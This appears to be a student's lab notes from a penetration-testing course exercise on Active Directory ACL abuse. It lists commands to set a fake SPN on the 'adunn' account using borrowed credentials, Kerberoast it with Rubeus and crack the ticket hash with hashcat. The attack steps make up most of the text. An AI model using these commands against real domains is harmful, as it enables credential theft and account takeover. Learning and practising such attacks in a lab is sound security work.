# [ACL Abuse Tactics](ACL%20Abuse%20Tactics.md)
## Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer.

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
![](Pasted%20image%2020260529150440.png)

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```
![](Pasted%20image%2020260529150448.png)

```shell
hashcat -m 13100 adunn_TGS /usr/share/wordlists/rockyou.txt
```
![](Pasted%20image%2020260529150458.png)
